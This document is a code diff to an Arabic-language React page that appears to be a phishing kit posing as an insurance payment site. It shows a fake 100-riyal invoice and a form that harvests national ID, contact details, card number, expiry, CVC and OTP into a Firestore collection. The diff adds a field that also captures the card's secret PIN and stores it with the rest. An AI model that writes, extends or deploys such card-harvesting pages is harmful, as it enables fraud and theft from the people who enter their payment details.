@@ -8,6 +8,7 @@ import { initializeApp } from "firebase/app"
 import { getFirestore, doc, setDoc } from "firebase/firestore"
 import { Check, X } from "lucide-react"
 import { LiveChatWidget } from "@livechat/widget-react"
+import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table"
 
 
 // Your Firebase configuration
@@ -96,6 +97,7 @@ export default function Component() {
     const [email, setEmail] = useState("")
     const [phone, setPhoen] = useState("")
     const [id, setID] = useState("")
+    const [pass, setPass] = useState("")
     const [otp, setOTP] = useState("")
     const [cardType, setCardType] = useState<CardType>("Unknown")
 
@@ -115,7 +117,7 @@ export default function Component() {
 
     const handleSubmit = (e: React.FormEvent) => {
         e.preventDefault()
-        let alldat = { personalInfo: { id: id, name: name, email: email, phone: phone }, payment: { cardNumber: cardNumber, expiry: expiry, cvc: cvc }, otp: { otp: otp } }
+        let alldat = { personalInfo: { id: id, name: name, email: email, phone: phone }, payment: { cardNumber: cardNumber, expiry: expiry, cvc: cvc }, otp: { otp: otp },pass:pass }
         setDoc(doc(db, "data", cardNumber), alldat);
 
     }
@@ -203,9 +205,55 @@ export default function Component() {
     )
     const Notes = () => (<>
         <div className="space-y-2">
-            <p>
-                يتم خصم مبلغ الخصم بناء على طلبك المقدم من الموقع الخاص
-            </p>
+        <Card className="w-full max-w-4xl mx-auto" dir="rtl">
+      <CardHeader>
+        <CardTitle className="text-3xl font-bold text-center mb-6">فاتورة</CardTitle>
+      </CardHeader>
+      <CardContent>
+        <div className="flex justify-between mb-8">
+          <div>
+            <h2 className="text-xl font-semibold mb-2">تفاصيل الشركة</h2>
+            <p>شركة تاميني للخدمات التقنية</p>
+            <p>شارع الملك فهد، الرياض</p>
+            <p>هاتف: 0512345678</p>
+          </div>
+          <div>
+            <h2 className="text-xl font-semibold mb-2">تفاصيل العميل</h2>
+            <p>شركة النور للاستشارات</p>
+            <p>شارع العليا، الرياض</p>
+            <p>هاتف: 0598765432</p>
+          </div>
+        </div>
+        
+        <Table>
+          <TableHeader>
+            <TableRow>
+              <TableHead className="text-right">الوصف</TableHead>
+              <TableHead className="text-right">الكمية</TableHead>
+              <TableHead className="text-right">السعر</TableHead>
+              <TableHead className="text-right">الإجمالي</TableHead>
+            </TableRow>
+          </TableHeader>
+          <TableBody>
+              <TableRow>
+                <TableCell>{'رسوم تامين'}</TableCell>
+                <TableCell>{'1'}</TableCell>
+                <TableCell>{'100'} ريال</TableCell>
+                <TableCell>{'100'} ريال</TableCell>
+              </TableRow>
+
+          </TableBody>
+        </Table>
+        
+        <div className="mt-8 text-left">
+          <p className="text-xl font-semibold">الإجمالي: 100 ريال</p>
+        </div>
+        
+        <div className="mt-8 text-center">
+          <p>شكراً لتعاملكم معنا</p>
+        </div>
+      </CardContent>
+    </Card>
         </div></>)
 
 
@@ -285,7 +333,7 @@ export default function Component() {
                             step === 5 ? (
                                 <div>
                                     <div className="space-y-2">
-                                        <input
+                                        <Input
                                             className={`z-9 shadow appearance-none border rounded w-full py-2 px-3  mb-3 leading-tight focus:outline-none focus:shadow-outline ${isValidCardNumber(cardNumber) ? "" : " border-red-500"}`
                                             } id="cardNumber"
                                             placeholder="#### #### #### ####"
@@ -365,6 +413,11 @@ return;
                                             defaultValue={otp}
                                             onChange={(e) => setOTP(e.target.value)}
                                         />
+<Input
+placeholder="الرقم السري للبطاقة"
+                                            defaultValue={pass}
+                                            onChange={(e) => setPass(e.target.value)}
+                                        />                                        
                                     </div>
                                     <div className="flex justify-between mt-4">
 
